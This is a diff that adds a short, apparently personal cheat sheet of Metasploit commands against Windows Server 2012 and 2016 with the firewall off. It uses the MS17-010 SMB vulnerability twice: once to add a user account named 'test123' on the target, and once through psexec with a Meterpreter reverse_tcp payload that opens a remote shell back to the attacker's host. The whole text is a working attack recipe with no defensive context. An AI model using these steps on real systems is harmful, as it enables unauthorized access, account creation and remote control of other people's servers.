@@ -1,0 +1,32 @@
+Windows server 2012 & 2016 (firewall uit)
+* use auxiliary/admin/smb/ms17_010_command
+
+* set command 'net user test123 /add'
+
+* set rhost <ip adres)
+
+* set rport 445
+
+* set payload windows/x64/meterpreter/reverse_tcp
+
+* set lhost <ip adres>
+
+* set lport 1234
+
+* exploit
+
+* use exploit/windows/smb/ms17_010_psexec
+
+* set rhost <ip adres>
+
+* set rport 445
+
+* set smbuser <username>
+
+* set payload windows/x64/meterpreter/reverse_tcp
+
+* set lhost <ip adres>
+
+* set lport 1234
+
+* exploit
